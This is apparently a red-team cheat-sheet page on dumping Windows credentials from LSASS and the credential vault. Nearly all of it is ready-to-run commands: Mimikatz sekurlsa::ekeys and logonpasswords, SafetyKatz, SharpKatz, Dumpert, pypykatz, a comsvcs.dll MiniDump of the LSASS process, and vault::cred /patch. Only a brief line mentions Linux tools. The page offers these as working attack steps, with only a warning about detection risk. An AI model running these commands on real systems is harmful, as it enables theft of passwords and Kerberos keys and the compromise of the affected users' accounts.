# Credentials Dumping

## LSASS

{% hint style="danger" %}
high chances of detection
{% endhint %}

### Kerberos encryption keys

The Kerberos SSP used by LSASS in order to provide different authentication methods.\
Therefore, it possible to dump Kerberos encryption keys using `sekurlsa::ekeys`.

```powershell
# Dump credentials on a local machine using Mimikatz.
Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 

# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys" 

# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys

# Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

# Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa

# Using comsvcs.dll
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
<lsass process ID> C:\Users\Public\lsass.dmp full 
```

### Logon Passwords

This usually shows recently logged on user and computer credentials.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' 
```

## Vault

Enumerates vault credentials of scheduled tasks.

```powershell
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

## Linux

* From a Linux attacking machine using **impacket**.
* From a Linux attacking machine using **Physmem2profit.**
